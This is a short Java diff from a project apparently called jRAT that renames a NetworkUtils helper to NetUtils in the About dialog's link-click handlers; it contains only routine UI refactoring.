@@ -36,7 +36,7 @@ import pro.jrat.Contributors.Contributor;
 import pro.jrat.Main;
 import pro.jrat.common.Version;
 import pro.jrat.utils.FlagUtils;
-import pro.jrat.utils.NetworkUtils;
+import pro.jrat.utils.NetUtils;
 
 @SuppressWarnings("serial")
 public class FrameAbout extends JFrame {
@@ -104,7 +104,7 @@ public class FrameAbout extends JFrame {
 		lblHttpredpoisncom.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
-				NetworkUtils.openUrl(Constants.HOST + "");
+				NetUtils.openUrl(Constants.HOST + "");
 			}
 		});
 		lblHttpredpoisncom.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/url.png")));
@@ -116,7 +116,7 @@ public class FrameAbout extends JFrame {
 		lblRedpoisn.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
-				NetworkUtils.openUrl("http://redpois0n.com");
+				NetUtils.openUrl("http://redpois0n.com");
 			}
 		});
 		lblRedpoisn.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/action_disconnect.png")));
